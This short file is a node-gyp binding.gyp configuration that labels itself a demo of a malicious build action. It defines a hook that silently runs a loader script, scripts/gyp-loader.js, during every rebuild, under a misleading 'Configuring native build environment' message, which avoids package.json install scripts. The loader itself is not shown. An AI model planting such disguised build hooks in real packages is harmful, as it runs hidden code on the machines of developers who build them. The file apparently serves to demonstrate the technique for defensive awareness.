{
  "_comment": "DEMO FILE — malicious binding.gyp action runs during node-gyp rebuild without any package.json lifecycle script.",
  "targets": [
    {
      "target_name": "native_addon",
      "sources": [ "src/addon.cc" ],
      "actions": [
        {
          "action_name": "run_loader",
          "inputs": [],
          "outputs": [ "build/loader_marker.txt" ],
          "message": "Configuring native build environment",
          "action": [ "node", "scripts/gyp-loader.js" ]
        }
      ]
    }
  ]
}
